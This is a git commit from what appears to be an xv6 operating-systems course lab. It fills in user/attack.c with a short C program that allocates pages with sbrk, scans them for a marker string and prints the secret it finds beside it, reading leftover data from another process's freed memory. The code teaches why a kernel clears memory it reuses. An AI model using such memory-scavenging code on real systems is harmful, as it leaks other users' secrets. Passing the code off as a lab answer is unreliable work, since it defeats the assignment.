07226f41f19f169d3087ba4c87ec8bca55bac421
Hackpaul <fpaulraj2007@gmail.com>
2026-09-18 23:29:07 +0530

    lab attack completed

--- user/attack.c
+++ user/attack.c
@@ -6,7 +6,15 @@
 int
 main(int argc, char *argv[])
 {
-  // Your code here.
-
+  char *data;
+  for (int i = 0; i < (8*16) ; i++) {
+    data = sbrk(4096);
+    for (int j = 0 ; j < 4096 - 16 ; j++  ) {
+      if(!strcmp(data + j , "This may help.")){
+        printf("%s", data + j + 16 );
+        exit(1);
+      }
+    }
+  }
   exit(1);
 }
